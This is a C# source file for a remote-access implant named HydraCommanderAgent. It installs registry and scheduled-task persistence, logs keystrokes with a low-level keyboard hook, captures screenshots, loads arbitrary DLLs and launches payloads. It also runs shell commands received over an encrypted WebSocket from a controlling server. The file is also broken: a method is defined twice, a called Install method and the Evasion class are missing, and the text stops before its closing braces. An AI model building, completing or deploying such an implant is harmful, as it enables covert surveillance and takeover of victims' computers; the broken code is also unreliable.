using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.WebSockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Diagnostics;
using Microsoft.Win32;
using System.Text.Json;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json.Schema;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace HydraCommanderAgent
{
    public static class KeyManager
    {
        public static byte[] Key { get; private set; }
        static KeyManager()
        {
            Key = new byte[32]; 
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(Key);
            }
            Console.WriteLine("[KeyManager] AES key generated.");
        }
    }

    public static class EncryptionHelper
    {
        public static string EncryptString(string plainText)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = KeyManager.Key;
                aes.GenerateIV();
                using (MemoryStream ms = new MemoryStream())
                {
                    ms.Write(aes.IV, 0, aes.IV.Length); 
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    using (StreamWriter sw = new StreamWriter(cs))
                    {
                        sw.Write(plainText);
                    }
                    return Convert.ToBase64String(ms.ToArray());
                }
            }
        }
        public static string DecryptString(string cipherText)
        {
            byte[] fullCipher = Convert.FromBase64String(cipherText);
            using (Aes aes = Aes.Create())
            {
                aes.Key = KeyManager.Key;
                byte[] iv = new byte[aes.BlockSize / 8];
                Array.Copy(fullCipher, 0, iv, 0, iv.Length);
                aes.IV = iv;
                using (MemoryStream ms = new MemoryStream())
                {
                    ms.Write(fullCipher, iv.Length, fullCipher.Length - iv.Length);
                    ms.Position = 0;
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    using (StreamReader sr = new StreamReader(cs))
                    {
                        return sr.ReadToEnd();
                    }
                }
            }
        }
    }

    public static class IPHelper
    {
        public static string GetLocalIPAddress()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        return ip.ToString();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[IPHelper] Error retrieving IP: " + ex.Message);
            }
            return "127.0.0.1";
        }
    }

    public class Persistence
    {
        private const string RegistryPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        private const string AppName = "HydraCommanderAgent";
        public string CurrentMethod { get; set; } = "Registry";

        public void InstallRegistryPersistence()
        {
            try
            {
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegistryPath, true))
                {
                    if (key != null)
                    {
                        object existingValue = key.GetValue(AppName);
                        if (existingValue == null || !existingValue.Equals(exePath))
                        {
                            key.SetValue(AppName, exePath);
                            Console.WriteLine("[Persistence] Registry persistence installed.");
                        }
                        else
                        {
                            Console.WriteLine("[Persistence] Registry persistence already installed.");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[Persistence] Error installing registry persistence: " + ex.Message);
            }
        }


        public void InstallScheduledTaskPersistence()
        {
            try
            {
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "schtasks",
                    Arguments = $"/Create /SC ONLOGON /TN \"HydraCommanderAgentTask\" /TR \"\\\"{exePath}\\\"\" /F",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using (Process proc = Process.Start(psi))
                {
                    proc.WaitForExit();
                    if (proc.ExitCode == 0)
                        Console.WriteLine("[Persistence] Scheduled Task persistence installed.");
                    else
                        Console.WriteLine("[Persistence] Failed to install Scheduled Task persistence.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[Persistence] Error installing scheduled task persistence: " + ex.Message);
            }
        }
        public void CheckIntegrity()
        {
            try
            {
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegistryPath))
                {
                    if (key != null)
                    {
                        object value = key.GetValue(AppName);
                        if (value == null || !value.Equals(exePath))
                        {
                            Console.WriteLine("[Persistence] Registry persistence missing. Reinstalling...");
                            InstallRegistryPersistence();
                        }
                        else
                        {
                            Console.WriteLine("[Persistence] Registry persistence integrity confirmed.");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[Persistence] Error checking persistence integrity: " + ex.Message);
            }
        }

        public void Mutate()
        {
            Random rnd = new Random();
            if (rnd.Next(2) == 0)
            {
                InstallRegistryPersistence();
                CurrentMethod = "Registry";
            }
            else
            {
                InstallScheduledTaskPersistence();
                CurrentMethod = "ScheduledTask";
            }
            Console.WriteLine("[Persistence] Persistence mutated. Current method: " + CurrentMethod);
        }
    }

    public static class CodeSignatureVerifier
    {
        private static readonly Guid WINTRUST_ACTION_GENERIC_VERIFY_V2 = new Guid("00aac56b-cd44-11d0-8cc2-00c04fc295ee");

        [DllImport("wintrust.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern uint WinVerifyTrust(IntPtr hwnd, [MarshalAs(UnmanagedType.LPStruct)] Guid pgActionID, ref WINTRUST_DATA pWVTData);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct WINTRUST_FILE_INFO
        {
            public uint cbStruct;
            public string pcwszFilePath;
            public IntPtr hFile;
            public IntPtr pgKnownSubject;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct WINTRUST_DATA
        {
            public uint cbStruct;
            public IntPtr pPolicyCallbackData;
            public IntPtr pSIPClientData;
            public uint dwUIChoice;
            public uint fdwRevocationChecks;
            public uint dwUnionChoice;
            public IntPtr pFile; 
            public uint dwStateAction;
            public IntPtr hWVTStateData;
            public string pwszURLReference;
            public uint dwProvFlags;
            public uint dwUIContext;
        }

        public static bool VerifyDigitalSignature(string filePath)
        {
            WINTRUST_FILE_INFO fileInfo = new WINTRUST_FILE_INFO();
            fileInfo.cbStruct = (uint)Marshal.SizeOf(typeof(WINTRUST_FILE_INFO));
            fileInfo.pcwszFilePath = filePath;
            fileInfo.hFile = IntPtr.Zero;
            fileInfo.pgKnownSubject = IntPtr.Zero;

            WINTRUST_DATA winTrustData = new WINTRUST_DATA();
            winTrustData.cbStruct = (uint)Marshal.SizeOf(typeof(WINTRUST_DATA));
            winTrustData.pPolicyCallbackData = IntPtr.Zero;
            winTrustData.pSIPClientData = IntPtr.Zero;
            winTrustData.dwUIChoice = 2; 
            winTrustData.fdwRevocationChecks = 0x00000001; 
            winTrustData.dwUnionChoice = 1; 
            winTrustData.pFile = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WINTRUST_FILE_INFO)));
            Marshal.StructureToPtr(fileInfo, winTrustData.pFile, false);
            winTrustData.dwStateAction = 0;
            winTrustData.hWVTStateData = IntPtr.Zero;
            winTrustData.pwszURLReference = null;
            winTrustData.dwProvFlags = 0x00000000;
            winTrustData.dwUIContext = 0;

            uint result = WinVerifyTrust(IntPtr.Zero, WINTRUST_ACTION_GENERIC_VERIFY_V2, ref winTrustData);
            Marshal.FreeHGlobal(winTrustData.pFile);

            return result == 0;
        }
    }

    public static class DelayLoadedDLLHelper
    {
        public static void LoadAndExecuteDLL(string dllPath)
        {
            if (File.Exists(dllPath))
            {
                try
                {
                    Assembly asm = Assembly.LoadFrom(dllPath);
                    Console.WriteLine("[DelayLoadedDLLHelper] Loaded delay-loaded DLL: " + dllPath);
                    var type = asm.GetType("DelayLoadedPlugin");
                    if (type != null)
                    {
                        var method = type.GetMethod("Run", BindingFlags.Public | BindingFlags.Static);
                        if (method != null)
                        {
                            method.Invoke(null, null);
                            Console.WriteLine("[DelayLoadedDLLHelper] Executed Run method from delay-loaded DLL.");
                        }
                        else
                        {
                            Console.WriteLine("[DelayLoadedDLLHelper] Run method not found in delay-loaded DLL.");
                        }
                    }
                    else
                    {
                        Console.WriteLine("[DelayLoadedDLLHelper] Type DelayLoadedPlugin not found in DLL.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[DelayLoadedDLLHelper] Error loading or executing DLL: " + ex.Message);
                }
            }
            else
            {
                Console.WriteLine("[DelayLoadedDLLHelper] DLL not found: " + dllPath);
            }
        }
    }

    public static class ScreenshotHelper
    {
        public static void CaptureScreen(string filename)
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                    bitmap.Save(filename, ImageFormat.Png);
                }
                Console.WriteLine("[ScreenshotHelper] Screenshot captured and saved to " + filename);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ScreenshotHelper] Error capturing screenshot: " + ex.Message);
            }
        }
    }

    public class KeyLogger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static StringBuilder _keys = new StringBuilder();

        public void Start()
        {
            _hookID = SetHook(_proc);
            Console.WriteLine("[KeyLogger] Keylogger started.");
        }
        public void Stop()
        {
            UnhookWindowsHookEx(_hookID);
            File.AppendAllText("keys.log", _keys.ToString());
            Console.WriteLine("[KeyLogger] Keylogger stopped. Keystrokes saved.");
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                _keys.Append((char)vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }

    public class Communication
    {
        private ClientWebSocket _webSocket;
        private Agent _agent;
        public Guid CommunicationID { get; set; } = Guid.NewGuid();
        public Uri APIEndpoint { get; set; }
        public Queue<string> MessageQueue { get; set; } = new Queue<string>();
        public string LastMessageSent { get; set; }
        public string LastMessageReceived { get; set; }
        public bool EncryptionEnabled { get; set; } = true;
        public bool IsAuthenticated { get; set; } = false;
        public string Status { get; set; } = "Disconnected";
        public string LastError { get; set; }
        public TimeSpan Timeout { get; set; } = TimeSpan.FromSeconds(30);
        public int RetryCount { get; set; } = 3;
        public string Protocol { get; set; } = "WebSocket";
        private const string CommandSchema = @"
{
  ""$schema"": ""http://json-schema.org/draft-07/schema#"",
  ""type"": ""object"",
  ""properties"": {
    ""CommandID"": { ""type"": ""string"" },
    ""Name"": { ""type"": ""string"" },
    ""Description"": { ""type"": ""string"" },
    ""IsCustom"": { ""type"": ""boolean"" },
    ""Parameters"": {
      ""type"": ""array"",
      ""items"": {
        ""type"": ""object"",
        ""properties"": {
          ""Key"": { ""type"": ""string"" },
          ""Value"": { ""type"": ""string"" }
        },
        ""required"": [""Key"", ""Value""]
      }
    }
  },
  ""required"": [""Name"", ""IsCustom""]
}";
        public Communication(Agent agent)
        {
            _agent = agent;
            _webSocket = new ClientWebSocket();
        }
        public async Task ConnectAsync(Uri wsUri, CancellationToken cancellationToken)
        {
            try
            {
                APIEndpoint = wsUri;
                Console.WriteLine("[Comm] Connecting to WebSocket server at " + wsUri);
                await _webSocket.ConnectAsync(wsUri, cancellationToken);
                Status = "Connected";
                IsAuthenticated = true;
                Console.WriteLine("[Comm] Connected to WebSocket server.");
                var initMessage = new
                {
                    AgentID = _agent.AgentID,
                    AuthToken = _agent.AuthenticationToken,
                    MessageType = "Init"
                };
                string jsonInit = JsonSerializer.Serialize(initMessage);
                await SendMessageAsync(jsonInit, cancellationToken);
            }
            catch (Exception ex)
            {
                LastError = ex.Message;
                Status = "Error";
                Console.WriteLine("[Comm] Connection error: " + ex.Message);
            }
        }
        public async Task SendMessageAsync(string message, CancellationToken cancellationToken)
        {
            if (_webSocket.State == WebSocketState.Open)
            {
                string outMessage = EncryptionEnabled ? EncryptionHelper.EncryptString(message) : message;
                byte[] buffer = Encoding.UTF8.GetBytes(outMessage);
                var segment = new ArraySegment<byte>(buffer);
                await _webSocket.SendAsync(segment, WebSocketMessageType.Text, true, cancellationToken);
                LastMessageSent = message;
                Console.WriteLine("[Comm] Sent message (encrypted=" + EncryptionEnabled + ").");
            }
            else
            {
                Console.WriteLine("[Comm] Cannot send message, WebSocket is not open.");
            }
        }
        public async Task<string> ReceiveMessageAsync(CancellationToken cancellationToken)
        {
            var buffer = new byte[4096];
            var segment = new ArraySegment<byte>(buffer);
            WebSocketReceiveResult result = null;
            try
            {
                result = await _webSocket.ReceiveAsync(segment, cancellationToken);
            }
            catch (Exception ex)
            {
                LastError = ex.Message;
                Console.WriteLine("[Comm] Error receiving message: " + ex.Message);
                return null;
            }
            if (result.MessageType == WebSocketMessageType.Close)
            {
                await _webSocket.CloseAsync(WebSocketCloseStatus.NormalClosure, "Closing", cancellationToken);
                Status = "Closed";
                return null;
            }
            string received = Encoding.UTF8.GetString(buffer, 0, result.Count);
            LastMessageReceived = received;
            if (EncryptionEnabled)
            {
                try
                {
                    received = EncryptionHelper.DecryptString(received);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[Comm] Decryption failed: " + ex.Message);
                    return null;
                }
            }
            return received;
        }
        public bool ValidateMessage(string message)
        {
            try
            {
                JSchema schema = JSchema.Parse(CommandSchema);
                JObject obj = JObject.Parse(message);
                IList<string> errors;
                bool valid = obj.IsValid(schema, out errors);
                if (!valid)
                    Console.WriteLine("[Comm] Message validation failed: " + string.Join(", ", errors));
                return valid;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[Comm] ValidateMessage error: " + ex.Message);
                return false;
            }
        }
        public void CheckCommunicationStatus()
        {
            Console.WriteLine("[Comm] Current status: " + Status);
        }
        public void HandleTimeout()
        {
            Console.WriteLine("[Comm] Timeout encountered. Reconnecting...");
        }
        public async Task RetryCommunication(CancellationToken cancellationToken)
        {
            for (int i = 0; i < RetryCount; i++)
            {
                try
                {
                    await ConnectAsync(APIEndpoint, cancellationToken);
                    if (_webSocket.State == WebSocketState.Open)
                    {
                        Console.WriteLine("[Comm] Reconnection successful.");
                        break;
                    }
                }
                catch
                {
                    Console.WriteLine("[Comm] Retry " + (i + 1) + " failed.");
                }
            }
        }
    }

    public class Log
    {
        public Guid LogID { get; set; } = Guid.NewGuid();
        public DateTime Timestamp { get; set; } = DateTime.Now;
        public Guid AgentID { get; set; }
        public Guid? CommandID { get; set; }
        public string Message { get; set; }
        public string EventType { get; set; }
        public string FilePath { get; set; }
        public Log(Guid agentID, string message, string eventType, Guid? commandID = null, string filePath = null)
        {
            AgentID = agentID;
            Message = message;
            EventType = eventType;
            CommandID = commandID;
            FilePath = filePath;
        }
        public void LogEvent()
        {
            string logMessage = $"[Log] [{Timestamp}] [{EventType}] {Message}";
            Console.WriteLine(logMessage);
            File.AppendAllText("agent.log", logMessage + Environment.NewLine);
        }
        public void UpdateLog(string newMessage)
        {
            Message = newMessage;
            Timestamp = DateTime.Now;
            Console.WriteLine($"[Log] Updated log: {Message}");
            File.AppendAllText("agent.log", $"[Log] [{Timestamp}] [Update] {Message}" + Environment.NewLine);
        }
    }

    public class ExecuteCommand
    {
        public Guid ExecutionID { get; set; } = Guid.NewGuid();
        public Command Command { get; set; }
        public Guid AgentID { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime? EndTime { get; set; }
        public string Status { get; set; }
        public bool IsCompleted { get; set; }
        public List<Log> ExecutionLogs { get; set; } = new List<Log>();
        public string ErrorDetails { get; set; }
        public CommandResult Result { get; set; }
        private Process currentProcess; 
        public ExecuteCommand(Command command, Guid agentID)
        {
            Command = command;
            AgentID = agentID;
        }
        public async Task StartExecutionAsync()
        {
            StartTime = DateTime.Now;
            Status = "Running";
            Console.WriteLine($"[ExecuteCommand] Starting execution of: {Command.Name}");
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + Command.Name,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                currentProcess = new Process();
                currentProcess.StartInfo = psi;
                currentProcess.Start();
                string output = await currentProcess.StandardOutput.ReadToEndAsync();
                string error = await currentProcess.StandardError.ReadToEndAsync();
                currentProcess.WaitForExit();
                if (currentProcess.ExitCode == 0)
                {
                    Result = new CommandResult
                    {
                        ResultID = Guid.NewGuid(),
                        OutputData = output,
                        Status = "Success",
                        Timestamp = DateTime.Now
                    };
                }
                else
                {
                    Result = new CommandResult
                    {
                        ResultID = Guid.NewGuid(),
                        OutputData = $"Error: {error}",
                        Status = "Failure",
                        Timestamp = DateTime.Now
                    };
                }
            }
            catch (Exception ex)
            {
                ErrorDetails = ex.Message;
                Result = new CommandResult
                {
                    ResultID = Guid.NewGuid(),
                    OutputData = ex.Message,
                    Status = "Failure",
                    Timestamp = DateTime.Now
                };
            }
            finally
            {
                EndTime = DateTime.Now;
                IsCompleted = true;
                Status = "Completed";
                CollectExecutionLogs();
            }
        }
        public void StopExecution()
        {
            try
            {
                if (currentProcess != null && !currentProcess.HasExited)
                {
                    currentProcess.Kill();
                    currentProcess.WaitForExit();
                    Status = "Stopped";
                    IsCompleted = true;
                    Console.WriteLine("[ExecuteCommand] Execution stopped.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ExecuteCommand] Error stopping execution: " + ex.Message);
            }
        }
        public void UpdateExecutionStatus(string newStatus)
        {
            Status = newStatus;
            Console.WriteLine($"[ExecuteCommand] Status updated to: {Status}");
        }
        public void CollectExecutionLogs()
        {
            ExecutionLogs.Add(new Log(AgentID, $"Execution completed with status: {Status}", "Execution", Command.CommandID));
            Console.WriteLine("[ExecuteCommand] Execution logs collected.");
        }
    }

    public class StatusAgent
    {
        public string State { get; set; }
        public DateTime LastUpdated { get; set; }
        public string Reason { get; set; }
        public StatusAgent(string initialState)
        {
            State = initialState;
            LastUpdated = DateTime.Now;
            Reason = "";
        }
        public void UpdateStatus(string newState, string reason)
        {
            State = newState;
            Reason = reason;
            LastUpdated = DateTime.Now;
            Console.WriteLine($"[StatusAgent] Status updated to {State} because: {Reason}");
        }
        public override string ToString()
        {
            return $"State: {State}, Last Updated: {LastUpdated}, Reason: {Reason}";
        }
    }

    public class User
    {
        public Guid Id { get; set; } = Guid.NewGuid();
        public string Name { get; set; }
        private string _passwordHash;
        public User(string name, string password)
        {
            Name = name;
            _passwordHash = ComputeHash(password);
        }
        private string ComputeHash(string input)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(input));
                return Convert.ToBase64String(bytes);
            }
        }
        public bool ValidatePassword(string password)
        {
            return ComputeHash(password) == _passwordHash;
        }
    }

    public class Parameter
    {
        public string Key { get; set; }
        public string Value { get; set; }
        public Parameter(string key, string value)
        {
            Key = key;
            Value = value;
        }
    }

    public class Command
    {
        public Guid CommandID { get; set; } = Guid.NewGuid();
        public string Name { get; set; }
        public string Description { get; set; }
        public bool IsCustom { get; set; }
        public List<Parameter> Parameters { get; set; } = new List<Parameter>();
        public bool ValidateCommand()
        {
            return !string.IsNullOrEmpty(Name);
        }
        public async Task<CommandResult> ExecuteCommandAsync(Guid agentID)
        {
            var executor = new ExecuteCommand(this, agentID);
            await executor.StartExecutionAsync();
            return executor.Result;
        }
    }

    public class CommandResult
    {
        public Guid ResultID { get; set; }
        public string OutputData { get; set; }
        public string Status { get; set; }
        public DateTime Timestamp { get; set; }
        public string FormatResult()
        {
            return $"[{Timestamp}] {Status}: {OutputData}";
        }
        public void StoreResult()
        {
            Console.WriteLine("[CommandResult] " + FormatResult());
            File.AppendAllText("command_results.log", FormatResult() + Environment.NewLine);
        }
    }

    public class Agent
    {
        public Guid AgentID { get; set; } = Guid.NewGuid();
        public string Hostname { get; set; } = Environment.MachineName;
        public string IPAddress { get; set; } = IPHelper.GetLocalIPAddress();
        public string Status { get; set; } = "Initialized";
        public DateTime LastActive { get; set; } = DateTime.Now;
        public bool IsCompromised { get; set; } = false;
        public string AuthenticationToken { get; set; }
        public bool EncryptionEnabled { get; set; } = true;
        public Command CurrentCommand { get; set; }
        public Queue<Command> CommandQueue { get; set; } = new Queue<Command>();
        public CommandResult LastCommandResult { get; set; }
        public string PersistenceStatus { get; set; }
        public string EvasionStatus { get; set; }
        public DateTime StartTime { get; set; } = DateTime.Now;
        public TimeSpan Uptime => DateTime.Now - StartTime;
        public Dictionary<string, string> HostResources { get; set; } = new Dictionary<string, string>();
        public List<string> Capabilities { get; set; } = new List<string> { "CommandExecution", "Persistence", "Evasion", "Monitoring", "Screenshot", "KeyCapturing", "DelayLoadedDLL" };
        public List<Log> Logs { get; set; } = new List<Log>();
        public string Payload { get; set; }
        public string LastError { get; set; }
        public Communication Communication { get; set; }
        public Persistence PersistenceModule { get; set; }
        public Evasion EvasionModule { get; set; }
        public StatusAgent StatusModule { get; set; }
        public KeyLogger KeyLogger { get; set; }
        public Agent()
        {
            Communication = new Communication(this);
            PersistenceModule = new Persistence();
            EvasionModule = new Evasion();
            StatusModule = new StatusAgent(Status);
            KeyLogger = new KeyLogger();
        }

        public void GatherInformationAlternative()
        {
            Console.WriteLine("[Agent] Alternative Gathering Information Executed.");
        }

        public void GatherInformation()
        {
            string info = $"Hostname: {Hostname}, IP: {IPAddress}, Uptime: {Uptime}";
            Logs.Add(new Log(AgentID, info, "InfoGathering"));
            Console.WriteLine("[Agent] Original Gathering Information Executed: " + info);
        }

        public async Task SendHeartbeatAsync(CancellationToken cancellationToken)
        {
            var heartbeatMessage = new
            {
                Action = "heartbeat",
                AgentID = AgentID,
                Status = Status,
                LastActive = LastActive,
                Uptime = Uptime.TotalSeconds,
                Resources = HostResources
            };
            string jsonMessage = JsonSerializer.Serialize(heartbeatMessage);
            await Communication.SendMessageAsync(jsonMessage, cancellationToken);
            Console.WriteLine("[Agent] Heartbeat sent.");
        }

        public bool VerifyDigitalSignature()
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            return CodeSignatureVerifier.VerifyDigitalSignature(exePath);
        }

        public async Task RegisterAsync(Uri registrationUri)
        {
            if (!VerifyDigitalSignature())
            {
                throw new Exception("Digital signature verification failed.");
            }
            using (var client = new HttpClient())
            {
                var registrationData = new
                {
                    AgentID,
                    Hostname,
                    IPAddress,
                    Status,
                    LastActive
                };
                string jsonData = JsonSerializer.Serialize(registrationData);
                var content = new StringContent(jsonData, Encoding.UTF8, "application/json");
                HttpResponseMessage response = await client.PostAsync(registrationUri, content);
                if (response.IsSuccessStatusCode)
                {
                    string respBody = await response.Content.ReadAsStringAsync();
                    var obj = JsonSerializer.Deserialize<Dictionary<string, string>>(respBody);
                    if (obj != null && obj.ContainsKey("auth_token"))
                    {
                        AuthenticationToken = obj["auth_token"];
                        Console.WriteLine("[Agent] Registration successful. Auth token: " + AuthenticationToken);
                    }
                    else
                    {
                        throw new Exception("Registration response missing auth_token.");
                    }
                }
                else
                {
                    throw new Exception("Registration failed: " + response.StatusCode);
                }
                Status = "Registered";
                StatusModule.UpdateStatus(Status, "Registration complete");
            }
        }

        public async Task ProcessCommandAsync(Command cmd)
        {
            if (cmd.Name.Equals("screenshot", StringComparison.OrdinalIgnoreCase))
            {
                string filename = "screenshot.png";
                foreach (var param in cmd.Parameters)
                {
                    if (param.Key.Equals("filename", StringComparison.OrdinalIgnoreCase))
                    {
                        filename = param.Value;
                        break;
                    }
                }
                ScreenshotHelper.CaptureScreen(filename);
            }
            else if (cmd.Name.Equals("start_keylogger", StringComparison.OrdinalIgnoreCase))
            {
                KeyLogger.Start();
            }
            else if (cmd.Name.Equals("stop_keylogger", StringComparison.OrdinalIgnoreCase))
            {
                KeyLogger.Stop();
            }
            else if (cmd.Name.Equals("load_dll", StringComparison.OrdinalIgnoreCase))
            {
                string dllPath = "";
                foreach (var param in cmd.Parameters)
                {
                    if (param.Key.Equals("dll_path", StringComparison.OrdinalIgnoreCase))
                    {
                        dllPath = param.Value;
                        break;
                    }
                }
                if (!string.IsNullOrEmpty(dllPath))
                    DelayLoadedDLLHelper.LoadAndExecuteDLL(dllPath);
                else
                    ReportError("DLL path not specified for load_dll command.");
            }
            else
            {
                await ExecuteCommandAsync(cmd);
            }
        }

        public async Task ExecuteCommandAsync(Command command)
        {
            Console.WriteLine($"[Agent] Executing command: {command.Name}");
            try
            {
                LastCommandResult = await command.ExecuteCommandAsync(AgentID);
                LastCommandResult.StoreResult();
            }
            catch (Exception ex)
            {
                ReportError("Command execution failed: " + ex.Message);
            }
        }
        public async Task SendDataAsync(string data, CancellationToken cancellationToken)
        {
            await Communication.SendMessageAsync(data, cancellationToken);
        }
        public async Task<string> ReceiveDataAsync(CancellationToken cancellationToken)
        {
            return await Communication.ReceiveMessageAsync(cancellationToken);
        }
        public async Task HandleCommunicationFailureAsync(CancellationToken cancellationToken)
        {
            Console.WriteLine("[Agent] Handling communication failure...");
            await Communication.RetryCommunication(cancellationToken);
        }
        public void UpdateStatus(string newStatus, string reason)
        {
            Status = newStatus;
            LastActive = DateTime.Now;
            StatusModule.UpdateStatus(newStatus, reason);
            Logs.Add(new Log(AgentID, $"Status updated to {newStatus} because: {reason}", "StatusUpdate"));
        }
        public void ReportError(string errorMessage)
        {
            LastError = errorMessage;
            Logs.Add(new Log(AgentID, errorMessage, "Error"));
            Console.WriteLine("[Agent] Error: " + errorMessage);
        }
        public void MonitorResources()
        {
            Process currentProcess = Process.GetCurrentProcess();
            double memoryUsageMB = currentProcess.WorkingSet64 / (1024.0 * 1024.0);
            double cpuUsage = (currentProcess.TotalProcessorTime.TotalMilliseconds / (Environment.ProcessorCount * Uptime.TotalMilliseconds)) * 100;
            HostResources["Memory_MB"] = memoryUsageMB.ToString("F2");
            HostResources["CPU_Percentage"] = cpuUsage.ToString("F2");
            Console.WriteLine($"[Agent] Resource Monitoring: CPU: {cpuUsage:F2}%, Memory: {memoryUsageMB:F2} MB");
        }
        public void ApplyEvasion()
        {
            string variant = EvasionModule.Mutate();
            EvasionModule.RewriteMemory();
            EvasionStatus = variant;
            Logs.Add(new Log(AgentID, "Applied evasion techniques.", "Evasion"));
        }

        public void ExecutePayload()
        {
            if (!string.IsNullOrEmpty(Payload))
            {
                try
                {
                    if (Payload.EndsWith(".ps1", StringComparison.OrdinalIgnoreCase))
                        Process.Start("powershell.exe", $"-File \"{Payload}\"");
                    else if (Payload.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                        Process.Start(Payload);
                    else
                    {
                        ReportError("Unsupported payload type: " + Payload);
                        return;
                    }
                    Console.WriteLine("[Agent] Payload executed: " + Payload);
                }
                catch (Exception ex)
                {
                    ReportError("Payload execution failed: " + ex.Message);
                }
            }
            else
            {
                Console.WriteLine("[Agent] No payload to execute.");
            }
        }
        public void GatherInformation()
        {
            string info = $"Hostname: {Hostname}, IP: {IPAddress}, Uptime: {Uptime}";
            Logs.Add(new Log(AgentID, info, "InfoGathering"));
            Console.WriteLine("[Agent] Original Gathering Information Executed: " + info);
        }

        public async Task RunAsync(Uri wsUri, CancellationToken cancellationToken)
        {
            PersistenceModule.Install();
            await Communication.ConnectAsync(wsUri, cancellationToken);
            _ = Task.Run(async () =>
            {
                while (!cancellationToken.IsCancellationRequested)
                {
                    PersistenceModule.CheckIntegrity();
                    ApplyEvasion();
                    MonitorResources();
                    GatherInformation();
                    await Task.Delay(10000, cancellationToken);
                }
            }, cancellationToken);

            _ = Task.Run(async () =>
            {
                while (!cancellationToken.IsCancellationRequested)
                {
                    await SendHeartbeatAsync(cancellationToken);
                    await Task.Delay(60000, cancellationToken);
                }
            }, cancellationToken);

            _ = Task.Run(async () =>
            {
                while (!cancellationToken.IsCancellationRequested)
                {
                    if (CommandQueue.Count > 0)
                    {
                        var cmd = CommandQueue.Dequeue();
                        await ProcessCommandAsync(cmd);
                    }
                    await Task.Delay(1000, cancellationToken);
                }
            }, cancellationToken);

            while (!cancellationToken.IsCancellationRequested)
            {
                string message = await Communication.ReceiveMessageAsync(cancellationToken);
                if (!string.IsNullOrEmpty(message) && Communication.ValidateMessage(message))
                {
                    Console.WriteLine("[Agent] Received message: " + message);
                    try
                    {
                        Command cmd = JsonSerializer.Deserialize<Command>(message);
                        if (cmd != null && cmd.ValidateCommand())
                        {
                            CurrentCommand = cmd;
                            CommandQueue.Enqueue(cmd);
                        }
                    }
                    catch (Exception ex)
                    {
                        ReportError("Error parsing command: " + ex.Message);
                    }
                }
                else
                {
                    await Task.Delay(500, cancellationToken);
                }
            }
        }
